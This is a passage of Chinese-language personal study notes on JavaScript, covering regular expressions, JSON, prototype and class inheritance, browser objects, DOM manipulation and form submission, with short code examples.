<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;第一种</span><br><span class="line">var re1 &#x3D; &#x2F;ABC&#x2F;;</span><br><span class="line">&#x2F;&#x2F;第二种</span><br><span class="line">var re2 &#x3D; new RegExp(&#39;ABC&#39;);</span><br></pre></td></tr></table></figure>
<p>RegExp对象的<code>test()</code>方法用于测试给定的字符串是否符合条件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">re2.test(&#39;ABC&#39;);  &#x2F;&#x2F;true</span><br><span class="line">re2.test(&#39;abc&#39;);  &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>
<p><strong>切分字符串</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">'a b   c'</span>.split(<span class="string">' '</span>); <span class="comment">// ['a', 'b', '', '', 'c']</span></span><br><span class="line"><span class="string">'a b   c'</span>.split(<span class="regexp">/\s+/</span>); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"><span class="string">'a,b, c  d'</span>.split(<span class="regexp">/[\s\,]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br><span class="line"><span class="string">'a,b;; c  d'</span>.split(<span class="regexp">/[\s\,\;]+/</span>); <span class="comment">// ['a', 'b', 'c', 'd']</span></span><br></pre></td></tr></table></figure>
<p><strong>分组</strong></p>
<p>用<code>()</code>表示的就是要提取的分组（Group）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$/</span>;</span><br><span class="line">re.exec(<span class="string">'010-12345'</span>); <span class="comment">// ['010-12345', '010', '12345']</span></span><br><span class="line">re.exec(<span class="string">'010 12345'</span>); <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>如果正则表达式中定义了组，就可以在<code>RegExp</code>对象上用<code>exec()</code>方法提取出子串来。</p>
<p><code>exec()</code>方法在匹配成功后，会返回一个<code>Array</code>，第一个元素是正则表达式匹配到的整个字符串，后面的字符串表示匹配成功的子串。</p>
<p><code>exec()</code>方法在匹配失败时返回<code>null</code>。</p>
<h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="*贪婪匹配"></a><strong>*贪婪匹配</strong></h3><p>需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;]</span><br></pre></td></tr></table></figure>
<p>由于<code>\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p>
<p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var re &#x3D; &#x2F;^(\d+?)(0*)$&#x2F;;</span><br><span class="line">re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;]</span><br></pre></td></tr></table></figure>
<p><strong>全局搜索</strong></p>
<p>JavaScript的正则表达式还有几个特殊的标志，最常用的是<code>g</code>，表示全局匹配。正则表达式还可以指定<code>i</code>标志，表示忽略大小写，<code>m</code>标志，表示执行多行匹配。</p>
<p><strong>作业</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//请尝试写一个验证Email地址的正则表达式。</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^[0-9a-zA-Z\.]+\@[0-9a-zA-Z]+\.(com|org)$/</span>;</span><br><span class="line">hould_pass = [<span class="string">'someone@gmail.com'</span>, <span class="string">'bill.gates@microsoft.com'</span>, <span class="string">'tom@voyager.org'</span>, <span class="string">'bob2015@163.com'</span>],</span><br><span class="line">    should_fail = [<span class="string">'test#gmail.com'</span>, <span class="string">'bill@microsoft'</span>, <span class="string">'bill%gates@ms.com'</span>, <span class="string">'@voyager.org'</span>];</span><br><span class="line"><span class="comment">//验证并提取出带名字的Email地址</span></span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/^\&lt;(\w+\s+\w+)\&gt; (\w+\.*\@\w+\.+\w+)$/</span>;</span><br><span class="line">shoule_pass = <span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>写正则首先要注意转义如：\s ,\w,\d</li>
<li>大小写用i标志</li>
</ul>
<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><ul>
<li>number：和JavaScript的<code>number</code>完全一致；</li>
<li>boolean：就是JavaScript的<code>true</code>或<code>false</code>；</li>
<li>string：就是JavaScript的<code>string</code>；</li>
<li>null：就是JavaScript的<code>null</code>；</li>
<li>array：就是JavaScript的<code>Array</code>表示方式——<code>[]</code>；</li>
<li>object：就是JavaScript的<code>{ ... }</code>表示方式。</li>
</ul>
<p>为了统一解析，JSON的字符串规定必须用双引号<code>&quot;&quot;</code>，Object的键也必须用双引号<code>&quot;&quot;</code>。</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a><strong>序列化</strong></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">		name: <span class="string">'xiaoming'</span>,</span><br><span class="line">		age: <span class="number">14</span>,</span><br><span class="line">		height: <span class="number">165</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming);</span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//&#123;"name":"xiaoming","age":14,"height":165&#125;</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">JSON</span>.stringify(xiaoming,<span class="literal">null</span>,<span class="string">' '</span>); </span><br><span class="line"><span class="built_in">console</span>.log(s); <span class="comment">//"&#123;</span></span><br><span class="line"> <span class="string">"name"</span>: <span class="string">"xiaoming"</span>,</span><br><span class="line"> <span class="string">"age"</span>: <span class="number">14</span>,</span><br><span class="line"> <span class="string">"height"</span>: <span class="number">165</span></span><br><span class="line">&#125;<span class="string">"</span></span><br><span class="line"><span class="string">//stringify(a,b,c)</span></span><br><span class="line"><span class="string">//a为对象名，b为指定的属性或者为一个函数，如['age','name'],c为' '代表逐行输出</span></span><br></pre></td></tr></table></figure>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>拿到一个JSON格式的字符串，我们直接用<code>JSON.parse()</code>把它变成一个JavaScript对象。</p>
<p><code>JSON.parse()</code>还可以接收一个函数，用来转换解析出的属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"小明","age":14&#125;'</span>); <span class="comment">// Object &#123;name: '小明', age: 14&#125;</span></span><br><span class="line"><span class="comment">//接受函数</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"name":"小明","age":14&#125;'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">key,value</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (key ===<span class="string">'name'</span>)&#123;<span class="keyword">return</span> value + <span class="string">'同学'</span>&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><p>在js中没有类的概念，所有的对象都是实例，继承关系不过是把一个对象的原型指向另一个对象而已。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 原型对象:</span><br><span class="line">var Student &#x3D; &#123;</span><br><span class="line">    name: &#39;Robot&#39;,</span><br><span class="line">    height: 1.2,</span><br><span class="line">    run: function () &#123;</span><br><span class="line">        console.log(this.name + &#39; is running...&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function createStudent(name) &#123;</span><br><span class="line">    &#x2F;&#x2F; 基于Student原型创建一个新对象:</span><br><span class="line">    var s &#x3D; Object.create(Student);</span><br><span class="line">    &#x2F;&#x2F; 初始化新对象:</span><br><span class="line">    s.name &#x3D; name;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var xiaoming &#x3D; createStudent(&#39;小明&#39;);</span><br><span class="line">xiaoming.run(); &#x2F;&#x2F; 小明 is running...</span><br><span class="line">xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>
<h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p>JavaScript对每个创建的对象都会设置一个原型，指向它的原型对象。</p>
<p>当我们用<code>obj.xxx</code>访问一个对象的属性时，JavaScript引擎先在当前对象上查找该属性，如果没有找到，就到其原型对象上找，如果还没有找到，就一直上溯到<code>Object.prototype</code>对象，最后，如果还没有找到，就只能返回<code>undefined</code>。</p>
<p><strong>构造函数</strong></p>
<p>除了直接用<code>{ ... }</code>创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Student(name) &#123;</span><br><span class="line">    this.name &#x3D; name;</span><br><span class="line">    this.hello &#x3D; function () &#123;</span><br><span class="line">        alert(&#39;Hello, &#39; + this.name + &#39;!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var xiaoming &#x3D; new Student(&#39;xiaoming&#39;)</span><br></pre></td></tr></table></figure>
<p>写了<code>new</code>，它就变成了一个构造函数，它绑定的<code>this</code>指向新创建的对象，并默认返回<code>this</code>，也就是说，不需要在最后写<code>return this;</code></p>
<p><strong>原型链：</strong></p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730195400823.png" alt="image-20200730195400823"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;常用创建对象</span><br><span class="line">function Student(props)&#123;</span><br><span class="line">	this.name &#x3D; props.name;</span><br><span class="line">	this.grade &#x3D; props.grade;</span><br><span class="line">&#125;</span><br><span class="line">Student.prototype.hello &#x3D; function()&#123;</span><br><span class="line">	alert(&#39;hello&#39;+this.name+&#39;.&#39;);</span><br><span class="line">&#125;</span><br><span class="line">function createStudent(props)&#123;</span><br><span class="line">	return new Student(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要让创建的对象共享一个<code>hello</code>函数，根据对象的属性查找原则，我们只要把<code>hello</code>函数移动到<code>xiaoming</code>、<code>xiaohong</code>这些对象共同的原型上就可以了，也就是<code>Student.prototype</code></p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730200247420.png" alt="image-20200730200247420"></p>
<h2 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = props.name || <span class="string">'Unnamed'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype.hello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PrimaryStudent</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 调用Student构造函数，绑定this变量:</span></span><br><span class="line">    Student.call(<span class="keyword">this</span>, props);</span><br><span class="line">    <span class="keyword">this</span>.grade = props.grade || <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; <span class="built_in">Object</span>.prototype ----&gt; <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>理解新的原型链</p>
<p><img src="/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730203439073.png" alt="image-20200730203439073"></p>
<h2 id="class继承"><a href="#class继承" class="headerlink" title="class继承"></a>class继承</h2><p><strong>class创建对象</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hello() &#123;</span><br><span class="line">        alert(<span class="string">'Hello, '</span> + <span class="keyword">this</span>.name + <span class="string">'!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> xiaoming = <span class="keyword">new</span> Student(<span class="string">'xiaoming'</span>);</span><br><span class="line">xiaoming.hello();</span><br></pre></td></tr></table></figure>
<p><strong>class继承</strong></p>
<p>直接通过<code>extends</code>实现</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrimaryStudent</span> <span class="keyword">extends</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name, grade) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name); <span class="comment">// 记得用super调用父类的构造方法!</span></span><br><span class="line">        <span class="keyword">this</span>.grade = grade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    myGrade() &#123;</span><br><span class="line">        alert(<span class="string">'I am at grade '</span> + <span class="keyword">this</span>.grade);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要通过<code>super(name)</code>来调用父类的构造函数，否则父类的<code>name</code>属性无法正常初始化。</p>
<h1 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h1><h2 id="浏览器对象"><a href="#浏览器对象" class="headerlink" title="浏览器对象"></a>浏览器对象</h2><p><strong>window</strong></p>
<p><code>window</code>对象不但充当全局作用域，而且表示浏览器窗口。</p>
<ul>
<li><code>innerWidth</code> <code>innerHeight</code>可以获取浏览器窗口的内部高度和宽度</li>
<li><code>outerWidth</code> <code>outerHeight</code>获取浏览器窗口的整个宽高</li>
</ul>
<p><strong>navigator</strong></p>
<p><code>navigator</code>对象表示浏览器的信息，最常用的属性包括：</p>
<ul>
<li>navigator.appName：浏览器名称；</li>
<li>navigator.appVersion：浏览器版本；</li>
<li>navigator.language：浏览器设置的语言；</li>
<li>navigator.platform：操作系统类型；</li>
<li>navigator.userAgent：浏览器设定的<code>User-Agent</code>字符串。</li>
</ul>
<h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>对象表示屏幕的信息，常用的属性有：</p>
<ul>
<li>screen.width：屏幕宽度，以像素为单位；</li>
<li>screen.height：屏幕高度，以像素为单位；</li>
<li>screen.colorDepth：返回颜色位数，如8、16、24。</li>
</ul>
<h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p><code>location</code>对象表示当前页面的URL信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location.href  &#x2F;&#x2F;url</span><br><span class="line">location.protocol; &#x2F;&#x2F; &#39;http&#39;</span><br><span class="line">location.host; &#x2F;&#x2F; &#39;www.example.com&#39;</span><br><span class="line">location.port; &#x2F;&#x2F; &#39;8080&#39;</span><br><span class="line">location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;</span><br><span class="line">location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;</span><br><span class="line">location.hash; &#x2F;&#x2F; &#39;TOP&#39;</span><br><span class="line">location.assign(&#39;...&#39;)  &#x2F;&#x2F;加载一个新的页面</span><br><span class="line">location.reload()  &#x2F;&#x2F;重新加载当前页面</span><br></pre></td></tr></table></figure>
<h3 id="document"><a href="#document" class="headerlink" title="document"></a>document</h3><p><code>document</code>对象表示当前页面。由于HTML在浏览器中以DOM形式表示为树形结构，<code>document</code>对象就是整个DOM树的根节点。</p>
<p>用<code>document</code>对象提供的<code>getElementById()</code>和<code>getElementsByTagName()</code>可以按ID获得一个DOM节点和按Tag名称获得一组DOM节点</p>
<p><code>document</code>对象还有一个<code>cookie</code>属性，可以获取当前页面的Cookie。JavaScript可以通过<code>document.cookie</code>读取到当前页面的Cookie。</p>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p><code>history</code>对象保存了浏览器的历史记录，JavaScript可以调用<code>history</code>对象的<code>back()</code>或<code>forward ()</code>，相当于用户点击了浏览器的“后退”或“前进”按钮。但现在不使用。</p>
<h2 id="操作DOM"><a href="#操作DOM" class="headerlink" title="操作DOM"></a>操作DOM</h2><p>由于HTML文档被浏览器解析后就是一棵DOM树，要改变HTML的结构，就需要通过JavaScript来操作DOM。</p>
<p>始终记住DOM是一个树形结构。操作一个DOM节点实际上就是这么几个操作：</p>
<ul>
<li>更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容；</li>
<li>遍历：遍历该DOM节点下的子节点，以便进行进一步操作；</li>
<li>添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点；</li>
<li>删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。</li>
</ul>
<p>在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。最常用的方法是<code>document.getElementById()</code>和<code>document.getElementsByTagName()</code>，以及CSS选择器<code>document.getElementsByClassName()</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&#39;test&#39;);  &#x2F;&#x2F; 返回ID为&#39;test&#39;的节点：</span><br><span class="line">ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;);  &#x2F;&#x2F; 先定位ID为&#39;test-table&#39;的节点，再返回其内部所有tr节点：</span><br><span class="line">document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;);  &#x2F;&#x2F; 先定位ID为&#39;test-div&#39;的节点，再返回其内部所有class包含red的节点：</span><br><span class="line">test.firstElementChild &#x2F;&#x2F;test下第一个结点</span><br><span class="line">test.lastElementChild  &#x2F;&#x2F;test下最后一个结点</span><br></pre></td></tr></table></figure>
<p>第二种方法是使用<code>querySelector()</code>和<code>querySelectorAll()</code>，需要了解selector语法，然后使用条件来获取节点，更加方便。</p>
<p><strong>作业</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML结构 --&gt;</span><br><span class="line">&lt;div id=<span class="string">"test-div"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"c-red"</span>&gt;</span><br><span class="line">    &lt;p id=<span class="string">"test-p"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Java&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-red c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Python&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Ruby&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Swift&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Haskell&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 选择&lt;p&gt;JavaScript&lt;/</span>p&gt;:</span><br><span class="line"><span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">'test-p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-red'</span>)[<span class="number">1</span>].getElementsByTagName(<span class="string">'p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择&lt;p&gt;Haskell&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> haskell = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-green'</span>)[<span class="number">1</span>].lastElementChild;</span><br></pre></td></tr></table></figure>
<h3 id="更新DOM"><a href="#更新DOM" class="headerlink" title="更新DOM"></a>更新DOM</h3><p>一种是修改<code>innerHTML</code>属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;获取&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p&#39;);</span><br><span class="line">p.innerHTML &#x3D; &#39;ABC&#39;</span><br><span class="line">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p>第二种是修改<code>innerText</code>或<code>textContent</code>属性，这样可以自动对字符串进行HTML编码，保证无法设置任何HTML标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p-id&#39;);</span><br><span class="line">&#x2F;&#x2F; 设置文本:</span><br><span class="line">p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; HTML被自动编码，无法设置一个&lt;script&gt;节点:</span><br><span class="line">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h3 id="插入DOM"><a href="#插入DOM" class="headerlink" title="插入DOM"></a>插入DOM</h3><p>一个是使用<code>appendChild</code>，把一个子节点添加到父节点的最后一个子节点。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML结构 --&gt;</span><br><span class="line">&lt;p id=<span class="string">"js"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="list"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="java"&gt;Java&lt;/</span>p&gt;</span><br><span class="line">    &lt;p id=<span class="string">"python"</span>&gt;Python&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="scheme"&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var list = document.getElementById('list');</span></span><br><span class="line"><span class="regexp">js = document.createElement('p');</span></span><br><span class="line"><span class="regexp">js.id = 'js';</span></span><br><span class="line"><span class="regexp">js.innerText = 'javascript';</span></span><br><span class="line"><span class="regexp">list.appendChild(js);</span></span><br></pre></td></tr></table></figure>
<p>另一个是<code>insertBefore</code>，可以使用<code>parentElement.insertBefore(newElement, referenceElement);</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br><span class="line">    list = <span class="built_in">document</span>.getElementById(<span class="string">'list'</span>),</span><br><span class="line">    ref = <span class="built_in">document</span>.getElementById(<span class="string">'python'</span>),</span><br><span class="line">    haskell = <span class="built_in">document</span>.createElement(<span class="string">'p'</span>);</span><br><span class="line">haskell.id = <span class="string">'haskell'</span>;</span><br><span class="line">haskell.innerText = <span class="string">'Haskell'</span>;</span><br><span class="line">list.insertBefore(haskell, ref);</span><br></pre></td></tr></table></figure>
<h3 id="删除DOM"><a href="#删除DOM" class="headerlink" title="删除DOM"></a>删除DOM</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"parent"</span>&gt;</span><br><span class="line">    &lt;p&gt;First&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Second&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var parent = document.getElementById('parent');</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[0]);</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[1]); /</span><span class="regexp">/ &lt;-- 浏览器报错</span></span><br></pre></td></tr></table></figure>
<p>浏览器报错：<code>parent.children[1]</code>不是一个有效的节点。原因就在于，当<code>&lt;p&gt;First&lt;/p&gt;</code>节点被删除后，<code>parent.children</code>的节点数量已经从2变为了1，索引<code>[1]</code>已经不存在了。</p>
<h2 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h2><p>HTML表单的输入控件主要有以下几种：</p>
<ul>
<li>文本框，对应的<code>&lt;input type=&quot;text&quot;&gt;</code>，用于输入文本；</li>
<li>口令框，对应的<code>&lt;input type=&quot;password&quot;&gt;</code>，用于输入口令；</li>
<li>单选框，对应的<code>&lt;input type=&quot;radio&quot;&gt;</code>，用于选择一项；</li>
<li>复选框，对应的<code>&lt;input type=&quot;checkbox&quot;&gt;</code>，用于选择多项；</li>
<li>下拉框，对应的<code>&lt;select&gt;</code>，用于选择一项；</li>
<li>隐藏文本，对应的<code>&lt;input type=&quot;hidden&quot;&gt;</code>，用户不可见，但表单提交时会把隐藏文本发送到服务器。</li>
</ul>
<h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value  &#x2F;&#x2F;用户输入的值</span><br></pre></td></tr></table></figure>
<h3 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value &#x3D; &#39;test&#39;;  &#x2F;&#x2F;文本框内容已被设置</span><br></pre></td></tr></table></figure>
<h3 id="HTML5控件"><a href="#HTML5控件" class="headerlink" title="HTML5控件"></a>HTML5控件</h3><p>HTML5新增了大量标准控件，常用的包括<code>date</code>、<code>datetime</code>、<code>datetime-local</code>、<code>color</code>等，它们都使用<code>&lt;input&gt;</code>标签。</p>
<h3 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h3><p>方式一是通过<code>&lt;form&gt;</code>元素的<code>submit()</code>方法提交一个表单，例如，响应一个<code>&lt;button&gt;</code>的<code>click</code>事件，在JavaScript代码中提交表单。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"button"</span> onclick=<span class="string">"doSubmitForm()"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span class="comment">// 可以在此修改form的input...</span></span><br><span class="line">    <span class="comment">// 提交form:</span></span><br><span class="line">    form.submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二种方式是响应<code>&lt;form&gt;</code>本身的<code>onsubmit</code>事件，在提交form时作修改。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span> onsubmit=<span class="string">"return checkForm()"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span 